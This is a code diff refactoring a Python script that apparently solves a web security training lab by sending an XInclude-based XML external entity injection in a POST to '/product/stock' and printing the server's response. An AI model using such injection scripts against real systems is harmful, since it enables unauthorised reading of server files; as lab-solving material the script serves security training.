@@ -1,12 +1,9 @@
 from ..utils import *
-from urllib.parse import urljoin
 from lxml import etree
 
-import requests
 
-
-def solve_lab(url, proxies):
-    url = urljoin(url, "/product/stock")
+def solve_lab(session):
+    path = "/product/stock"
 
     xinclude_namespace = "http://www.w3.org/2001/XInclude"
     xinclude = "{%s}" % xinclude_namespace
@@ -19,10 +16,10 @@ def solve_lab(url, proxies):
     data = {"productId": foo, "storeId": "1"}
 
     print_info(
-        f'Injecting an XML external entity with the following POST request to "{url}":\n'
+        f'Injecting an XML external entity with the following POST request to "{path}":\n'
     )
     print(f"{data}\n")
 
-    resp = requests.post(url, proxies=proxies, verify=False, data=data)
+    resp = session.post_path(path, data=data)
     print_success("XXE injection successful with the following response:\n")
     print(f"{resp.text}\n")
